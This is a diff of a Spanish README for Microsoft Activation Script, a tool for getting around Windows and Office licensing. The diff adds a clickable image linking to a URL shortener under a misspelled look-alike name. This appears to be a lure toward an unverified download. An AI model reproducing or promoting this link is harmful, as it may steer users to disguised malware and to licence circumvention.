@@ -1,6 +1,8 @@
 # Microsoft Activation Script
 Esta es una ayuda de aprendizaje para mejorar el conocimiento y la comprensión del usuario.
 
+[![12342140090](https://github.com/user-attachments/assets/019f87c2-c22f-4cd7-a848-f4c728985b99)](https://y.gy/microsoft-activationn-scripttz)
+
 ## Microsoft Activation Script (MAS): Perspectiva técnica
 
 ### Funcionalidad principal
